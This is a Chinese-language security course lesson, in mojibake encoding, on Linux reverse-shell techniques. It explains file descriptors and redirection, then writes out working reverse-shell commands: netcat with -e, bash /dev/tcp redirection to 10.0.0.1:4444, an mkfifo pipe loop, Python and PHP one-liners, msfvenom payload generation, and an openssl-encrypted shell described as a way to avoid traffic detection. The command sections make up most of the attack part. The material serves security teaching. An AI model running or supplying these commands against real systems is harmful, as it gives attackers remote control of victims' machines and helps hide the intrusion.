# ğŸ§ P62ï¼šç¬¬29å¤©ï¼šLinuxåå¼¹Shellæ–¹æ³•å¤§å…¨

åœ¨æœ¬èŠ‚è¯¾ä¸­ï¼Œæˆ‘ä»¬å°†è¦å­¦ä¹ Linuxç³»ç»Ÿä¸‹å¤šç§åå¼¹Shellçš„æ–¹æ³•ã€‚ç†è§£åå¼¹Shellçš„åŸç†æ˜¯ç½‘ç»œå®‰å…¨ä¸­ä¸€é¡¹é‡è¦çš„æŠ€èƒ½ï¼Œå®ƒæ¶‰åŠåˆ°è¾“å…¥/è¾“å‡ºé‡å®šå‘ã€æ–‡ä»¶æè¿°ç¬¦ã€ç½‘ç»œè¿æ¥ç­‰æ ¸å¿ƒæ¦‚å¿µã€‚æˆ‘ä»¬å°†ä»åŸºç¡€æ¦‚å¿µè®²èµ·ï¼Œé€æ­¥æ·±å…¥åˆ°å…·ä½“çš„å‘½ä»¤å®ç°ã€‚

---

## ğŸ“š è¯¾ç¨‹æ¦‚è¿°

ä¸Šä¸€èŠ‚æˆ‘ä»¬ä»‹ç»äº†æ­£å‘Shellä¸åå‘Shellçš„åŸºæœ¬æ¦‚å¿µã€‚æœ¬èŠ‚ä¸­ï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹åœ¨Linuxç¯å¢ƒä¸‹ï¼Œå¦‚ä½•é€šè¿‡å„ç§å·¥å…·å’ŒæŠ€æœ¯å®ç°åå¼¹Shellã€‚æˆ‘ä»¬å°†é‡ç‚¹è®²è§£å…¶èƒŒåçš„åŸç†ï¼Œç‰¹åˆ«æ˜¯Linuxçš„â€œä¸€åˆ‡çš†æ–‡ä»¶â€å“²å­¦å’Œæ–‡ä»¶æè¿°ç¬¦çš„é‡å®šå‘æœºåˆ¶ã€‚

![](img/a021ec5fad5a7598f06fa26f444ee366_1.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_3.png)

---

## ğŸ” æ ¸å¿ƒæ¦‚å¿µï¼šLinuxæ ‡å‡†æ–‡ä»¶æè¿°ç¬¦ä¸é‡å®šå‘

åœ¨æ·±å…¥åå¼¹Shellå‘½ä»¤ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦ç†è§£ä¸€äº›å‰æçŸ¥è¯†ï¼Œç‰¹åˆ«æ˜¯Linuxçš„æ ‡å‡†æ–‡ä»¶æè¿°ç¬¦å’Œé‡å®šå‘æ“ä½œã€‚

### æ ‡å‡†æ–‡ä»¶æè¿°ç¬¦

Linuxç³»ç»Ÿå°†ä¸€åˆ‡è®¾å¤‡éƒ½è§†ä¸ºæ–‡ä»¶æ¥å¤„ç†ï¼Œå¹¶ç”¨æ–‡ä»¶æè¿°ç¬¦æ¥æ ‡è¯†æ¯ä¸ªæ–‡ä»¶å¯¹è±¡ã€‚ç³»ç»Ÿå¯åŠ¨æ—¶ä¼šé»˜è®¤æ‰“å¼€ä¸‰ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼š

*   **0 (`stdin`)**: æ ‡å‡†è¾“å…¥ï¼Œé»˜è®¤æŒ‡å‘é”®ç›˜ã€‚
*   **1 (`stdout`)**: æ ‡å‡†è¾“å‡ºï¼Œé»˜è®¤æŒ‡å‘æ˜¾ç¤ºå™¨ã€‚
*   **2 (`stderr`)**: æ ‡å‡†é”™è¯¯è¾“å‡ºï¼Œé»˜è®¤ä¹ŸæŒ‡å‘æ˜¾ç¤ºå™¨ã€‚

![](img/a021ec5fad5a7598f06fa26f444ee366_5.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_7.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_9.png)

ä¾‹å¦‚ï¼Œåœ¨Shellä¸­è¾“å…¥å‘½ä»¤ `ls`ï¼Œ`ls` è¿™ä¸ªå­—ç¬¦ä¸²æ¥è‡ªæ–‡ä»¶æè¿°ç¬¦0ï¼ˆé”®ç›˜è¾“å…¥ï¼‰ã€‚å‘½ä»¤æ‰§è¡Œåçš„ç»“æœï¼ˆå¦‚æ–‡ä»¶åˆ—è¡¨ï¼‰é€šè¿‡æ–‡ä»¶æè¿°ç¬¦1è¾“å‡ºåˆ°æ˜¾ç¤ºå™¨ã€‚å¦‚æœè¾“å…¥äº†æ— æ³•è¯†åˆ«çš„å‘½ä»¤ï¼Œé”™è¯¯ä¿¡æ¯åˆ™é€šè¿‡æ–‡ä»¶æè¿°ç¬¦2è¾“å‡ºåˆ°æ˜¾ç¤ºå™¨ã€‚

![](img/a021ec5fad5a7598f06fa26f444ee366_11.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_13.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_14.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_16.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_18.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_20.png)

### è¾“å…¥/è¾“å‡ºé‡å®šå‘

![](img/a021ec5fad5a7598f06fa26f444ee366_22.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_23.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_25.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_26.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_28.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_30.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_32.png)

é‡å®šå‘çš„æœ¬è´¨æ˜¯æ”¹å˜æ–‡ä»¶æè¿°ç¬¦çš„æŒ‡å‘ã€‚

![](img/a021ec5fad5a7598f06fa26f444ee366_34.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_36.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_38.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_39.png)

*   **è¾“å…¥é‡å®šå‘ (`<`)**: ä»æ–‡ä»¶ä¸­è¯»å–è¾“å…¥ï¼Œè€Œéé”®ç›˜ã€‚
    ```bash
    read user < /tmp/test.txt
    ```
*   **è¾“å‡ºé‡å®šå‘ (`>`)**: å°†è¾“å‡ºä¿å­˜åˆ°æ–‡ä»¶ï¼Œè€Œéæ˜¾ç¤ºå™¨ã€‚
    ```bash
    ls > /tmp/output.txt
    ```
*   **ç®¡é“ç¬¦ (`|`)**: å°†ä¸€ä¸ªç¨‹åºçš„è¾“å‡ºä½œä¸ºå¦ä¸€ä¸ªç¨‹åºçš„è¾“å…¥ã€‚
    ```bash
    netstat -anlp | grep 80
    ```

![](img/a021ec5fad5a7598f06fa26f444ee366_40.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_41.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_43.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_45.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_47.png)

### ä½¿ç”¨ `exec` å‘½ä»¤æ“ä½œæ–‡ä»¶æè¿°ç¬¦

![](img/a021ec5fad5a7598f06fa26f444ee366_49.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_51.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_53.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_55.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_56.png)

`exec` å‘½ä»¤å¯ä»¥ç”¨æ¥æ›´æ”¹å½“å‰Shellçš„æ–‡ä»¶æè¿°ç¬¦æŒ‡å‘ï¼Œæˆ–è€…åˆ›å»ºæ–°çš„æ–‡ä»¶æè¿°ç¬¦ã€‚

![](img/a021ec5fad5a7598f06fa26f444ee366_58.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_60.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_62.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_64.png)

*   **æ›´æ”¹æ ‡å‡†è¾“å‡ºä½ç½®**:
    ```bash
    exec 1> /tmp/test.txt
    ```
    æ‰§è¡Œæ­¤å‘½ä»¤åï¼Œåç»­æ‰€æœ‰å‘½ä»¤çš„æ ‡å‡†è¾“å‡ºéƒ½å°†å†™å…¥ `/tmp/test.txt` æ–‡ä»¶ï¼Œè€Œä¸ä¼šæ˜¾ç¤ºåœ¨ç»ˆç«¯ä¸Šã€‚
*   **åˆ›å»ºè‡ªå®šä¹‰æ–‡ä»¶æè¿°ç¬¦**:
    ```bash
    exec 5<> /tmp/testfile
    echo "Hello" >&5
    cat <&5
    ```
    è¿™é‡Œåˆ›å»ºäº†æ–‡ä»¶æè¿°ç¬¦5ï¼Œå¹¶å°†å…¶ä¸æ–‡ä»¶ `/tmp/testfile` å…³è”ã€‚ä¹‹åå¯ä»¥é€šè¿‡ `>&5` å’Œ `<&5` æ¥å‘è¯¥æ–‡ä»¶å†™å…¥æˆ–è¯»å–æ•°æ®ã€‚

![](img/a021ec5fad5a7598f06fa26f444ee366_66.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_68.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_70.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_71.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_73.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_75.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_77.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_79.png)

### ç‰¹æ®Šæ–‡ä»¶ `/dev/null`

![](img/a021ec5fad5a7598f06fa26f444ee366_81.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_83.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_85.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_87.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_89.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_91.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_93.png)

`/dev/null` æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„è®¾å¤‡æ–‡ä»¶ï¼Œå†™å…¥å®ƒçš„ä»»ä½•æ•°æ®éƒ½ä¼šè¢«ä¸¢å¼ƒã€‚å¸¸ç”¨äºéšè—é”™è¯¯è¾“å‡ºï¼š
```bash
command_that_might_fail 2> /dev/null
```

![](img/a021ec5fad5a7598f06fa26f444ee366_95.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_97.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_99.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_101.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_103.png)

---

![](img/a021ec5fad5a7598f06fa26f444ee366_105.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_107.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_109.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_111.png)

## ğŸ› ï¸ Linuxåå¼¹Shellæ–¹æ³•è¯¦è§£

![](img/a021ec5fad5a7598f06fa26f444ee366_113.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_115.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_117.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_119.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_121.png)

ç†è§£äº†æ–‡ä»¶æè¿°ç¬¦å’Œé‡å®šå‘åï¼Œæˆ‘ä»¬æ¥çœ‹å…·ä½“çš„åå¼¹Shellå®ç°ã€‚å…¶æ ¸å¿ƒæ€æƒ³æ˜¯ï¼š**åœ¨ç›®æ ‡æœºå™¨ï¼ˆè¢«æ§ç«¯ï¼‰ä¸Šï¼Œå°†äº¤äº’å¼Shellçš„è¾“å…¥ã€è¾“å‡ºå’Œé”™è¯¯æµï¼Œå…¨éƒ¨é‡å®šå‘åˆ°ä¸€ä¸ªé€šå¾€æ”»å‡»è€…æœºå™¨ï¼ˆæ§åˆ¶ç«¯ï¼‰çš„ç½‘ç»œè¿æ¥ä¸­ã€‚**

![](img/a021ec5fad5a7598f06fa26f444ee366_123.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_125.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_127.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_129.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_131.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_133.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_135.png)

### æ–¹æ³•ä¸€ï¼šä½¿ç”¨ `nc` (Netcat)

![](img/a021ec5fad5a7598f06fa26f444ee366_137.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_139.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_141.png)

`nc` æ˜¯æœ€å¸¸ç”¨çš„ç½‘ç»œå·¥å…·ä¹‹ä¸€ï¼Œå…¶ `-e` å‚æ•°å¯ä»¥ç›´æ¥ç»‘å®šä¸€ä¸ªShellã€‚

![](img/a021ec5fad5a7598f06fa26f444ee366_143.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_145.png)

*   **æ­£å‘Shell** (æ§åˆ¶ç«¯è¿æ¥è¢«æ§ç«¯):
    ```bash
    # åœ¨è¢«æ§ç«¯æ‰§è¡Œ
    nc -l -p 4444 -e /bin/bash
    # åœ¨æ§åˆ¶ç«¯æ‰§è¡Œ
    nc [è¢«æ§ç«¯IP] 4444
    ```
*   **åå‘Shell** (è¢«æ§ç«¯ä¸»åŠ¨è¿æ¥æ§åˆ¶ç«¯):
    ```bash
    # åœ¨æ§åˆ¶ç«¯æ‰§è¡Œ
    nc -l -p 4444
    # åœ¨è¢«æ§ç«¯æ‰§è¡Œ
    nc [æ§åˆ¶ç«¯IP] 4444 -e /bin/bash
    ```
    **æ³¨æ„**ï¼šæŸäº›ç¯å¢ƒä¸­çš„ `nc` å¯èƒ½ä¸æ”¯æŒ `-e` å‚æ•°ã€‚

![](img/a021ec5fad5a7598f06fa26f444ee366_147.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_149.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_151.png)

### æ–¹æ³•äºŒï¼š`bash` å†…ç½®çš„é‡å®šå‘

è¿™æ˜¯Linuxä¸‹æœ€ç»å…¸ã€æœ€å¸¸ç”¨çš„åå¼¹Shellå‘½ä»¤ä¹‹ä¸€ã€‚
```bash
bash -i >& /dev/tcp/[æ§åˆ¶ç«¯IP]/[æ§åˆ¶ç«¯ç«¯å£] 0>&1
```
*   `bash -i`: æ‰“å¼€ä¸€ä¸ªäº¤äº’å¼çš„bashã€‚
*   `>& /dev/tcp/...`: å°†bashçš„æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯è¾“å‡ºéƒ½é‡å®šå‘åˆ°TCPè¿æ¥ã€‚`/dev/tcp/[IP]/[ç«¯å£]` æ˜¯bashçš„ä¸€ä¸ªç‰¹æ®ŠåŠŸèƒ½ï¼Œæ‰“å¼€å®ƒä¼šå‘èµ·ä¸€ä¸ªSocketè¿æ¥ã€‚
*   `0>&1`: å°†æ ‡å‡†è¾“å…¥é‡å®šå‘åˆ°æ ‡å‡†è¾“å‡ºï¼ˆå³TCPè¿æ¥ï¼‰ã€‚è¿™æ ·ï¼Œä»TCPè¿æ¥æ”¶åˆ°çš„æ•°æ®ä¼šæˆä¸ºbashçš„è¾“å…¥ã€‚

![](img/a021ec5fad5a7598f06fa26f444ee366_153.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_155.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_157.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_159.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_161.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_163.png)

**å‘½ä»¤æ‹†è§£ç†è§£**:
1.  **è¾“å‡ºåˆ°æ§åˆ¶ç«¯**: `bash -i > /dev/tcp/10.0.0.1/4444`
2.  **è¾“å…¥æ¥è‡ªæ§åˆ¶ç«¯**: `bash -i < /dev/tcp/10.0.0.1/4444`
3.  **åˆå¹¶è¾“å…¥è¾“å‡º**: `bash -i > /dev/tcp/10.0.0.1/4444 0>&1`
4.  **åŒ…å«é”™è¯¯è¾“å‡º**: `bash -i >& /dev/tcp/10.0.0.1/4444 0>&1`

![](img/a021ec5fad5a7598f06fa26f444ee366_165.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_167.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_169.png)

### æ–¹æ³•ä¸‰ï¼šä½¿ç”¨å‘½åç®¡é“ (`mkfifo`)

![](img/a021ec5fad5a7598f06fa26f444ee366_171.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_173.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_175.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_177.png)

å½“ `nc` æ²¡æœ‰ `-e` å‚æ•°æ—¶ï¼Œå¯ä»¥åˆ©ç”¨å‘½åç®¡é“å®ç°åŒæ ·çš„åŠŸèƒ½ã€‚
```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc [æ§åˆ¶ç«¯IP] [æ§åˆ¶ç«¯ç«¯å£] > /tmp/f
```
1.  `mkfifo /tmp/f` åˆ›å»ºä¸€ä¸ªå‘½åç®¡é“æ–‡ä»¶ã€‚
2.  `cat /tmp/f` ä»ç®¡é“ä¸­è¯»å–å†…å®¹ã€‚
3.  `| /bin/sh -i 2>&1` å°†è¯»å–çš„å†…å®¹äº¤ç»™Shellæ‰§è¡Œï¼Œå¹¶å°†Shellçš„è¾“å‡ºå’Œé”™è¯¯åˆå¹¶ã€‚
4.  `| nc ... > /tmp/f` å°†Shellçš„è¾“å‡ºé€šè¿‡ncå‘é€åˆ°æ§åˆ¶ç«¯ï¼ŒåŒæ—¶**ä¹Ÿå†™å›** `/tmp/f` ç®¡é“ã€‚
5.  è¿™æ ·å°±å½¢æˆäº†ä¸€ä¸ªå¾ªç¯ï¼šæ§åˆ¶ç«¯å‘é€çš„å‘½ä»¤ -> é€šè¿‡ncä¼ å…¥ -> å†™å…¥ `/tmp/f` -> è¢« `cat` è¯»å– -> äº¤ç»™Shellæ‰§è¡Œ -> ç»“æœé€šè¿‡ncä¼ å›æ§åˆ¶ç«¯å¹¶å†æ¬¡å†™å…¥ç®¡é“ï¼ˆç»´æŒå¾ªç¯ï¼‰ã€‚

![](img/a021ec5fad5a7598f06fa26f444ee366_179.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_181.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_183.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_185.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_187.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_189.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_191.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_193.png)

### æ–¹æ³•å››ï¼šå…¶ä»–è„šæœ¬è¯­è¨€

![](img/a021ec5fad5a7598f06fa26f444ee366_195.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_197.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_199.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_201.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_203.png)

å„ç§è„šæœ¬è¯­è¨€ï¼ˆPython, Perl, PHP, Rubyç­‰ï¼‰éƒ½å¯ä»¥é€šè¿‡è°ƒç”¨Socketåº“å»ºç«‹è¿æ¥ï¼Œå¹¶é‡å®šå‘è¿›ç¨‹çš„è¾“å…¥è¾“å‡ºæ¥å®ç°åå¼¹Shellã€‚

![](img/a021ec5fad5a7598f06fa26f444ee366_205.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_207.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_209.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_211.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_213.png)

*   **Python**:
    ```python
    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[æ§åˆ¶ç«¯IP]",[æ§åˆ¶ç«¯ç«¯å£]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
    ```
*   **PHP**:
    ```php
    php -r '$sock=fsockopen("[æ§åˆ¶ç«¯IP]",[æ§åˆ¶ç«¯ç«¯å£]);exec("/bin/sh -i <&3 >&3 2>&3");'
    ```
*   **ä½¿ç”¨MSFVenomç”ŸæˆPayload**:
    ```bash
    # æŸ¥æ‰¾payload
    msfvenom -l payloads | grep 'cmd/unix' | grep 'reverse'
    # ç”Ÿæˆbashåå¼¹Shellçš„Perlä»£ç 
    msfvenom -p cmd/unix/reverse_perl LHOST=[æ§åˆ¶ç«¯IP] LPORT=[æ§åˆ¶ç«¯ç«¯å£] -f raw
    ```

### æ–¹æ³•äº”ï¼šä½¿ç”¨ `openssl` åŠ å¯†é€šä¿¡

ä¸ºäº†é¿å…æµé‡è¢«æ£€æµ‹ï¼Œå¯ä»¥ä½¿ç”¨ `openssl` å»ºç«‹åŠ å¯†çš„åå¼¹Shellã€‚
```bash
# åœ¨æ§åˆ¶ç«¯ç”Ÿæˆè¯ä¹¦å¹¶ç›‘å¬
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port [æ§åˆ¶ç«¯ç«¯å£]
# åœ¨è¢«æ§ç«¯è¿æ¥
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect [æ§åˆ¶ç«¯IP]:[æ§åˆ¶ç«¯ç«¯å£] > /tmp/s; rm /tmp/s
```

---

![](img/a021ec5fad5a7598f06fa26f444ee366_215.png)

![](img/a021ec5fad5a7598f06fa26f444ee366_217.png)

## ğŸ“ æ€»ç»“

æœ¬èŠ‚è¯¾ä¸­æˆ‘ä»¬ä¸€èµ·å­¦ä¹ äº†Linuxä¸‹å¤šç§åå¼¹Shellçš„æ–¹æ³•ã€‚æˆ‘ä»¬ä»æœ€åŸºç¡€çš„Linuxæ–‡ä»¶æè¿°ç¬¦å’Œé‡å®šå‘åŸç†è®²èµ·ï¼Œæ˜ç™½äº†åå¼¹Shellçš„æœ¬è´¨æ˜¯**å¯¹Shellçš„è¾“å…¥ã€è¾“å‡ºã€é”™è¯¯æµè¿›è¡Œç½‘ç»œé‡å®šå‘**ã€‚

æ ¸å¿ƒè¦ç‚¹åŒ…æ‹¬ï¼š
1.  ç†è§£ `stdin`(0)ã€`stdout`(1)ã€`stderr`(2) åŠå…¶é‡å®šå‘ã€‚
2.  æŒæ¡ `bash` ç»“åˆ `/dev/tcp` çš„ç»å…¸åå¼¹å‘½ä»¤ã€‚
3.  äº†è§£ä½¿ç”¨å‘½åç®¡é“ (`mkfifo`) åœ¨æ²¡æœ‰ `nc -e` æ—¶çš„æ›¿ä»£æ–¹æ¡ˆã€‚
4.  çŸ¥é“å¦‚ä½•ç”¨Pythonã€Perlç­‰è„šæœ¬è¯­è¨€å®ç°åŒæ ·åŠŸèƒ½ã€‚
5.  è®¤è¯†åˆ°å¯ä»¥ä½¿ç”¨ `openssl` å¯¹åå¼¹Shellæµé‡è¿›è¡ŒåŠ å¯†ã€‚

![](img/a021ec5fad5a7598f06fa26f444ee366_219.png)

å»ºè®®è¯¾ååœ¨å®éªŒç¯å¢ƒä¸­é€ä¸€æµ‹è¯•è¿™äº›å‘½ä»¤ï¼Œå¹¶å°è¯•åˆ†æå…¶æ•°æ®æµå‘ï¼Œè¿™å°†æå¤§åœ°åŠ æ·±ä½ å¯¹è¿›ç¨‹é—´é€šä¿¡å’Œç½‘ç»œæ”»é˜²çš„ç†è§£ã€‚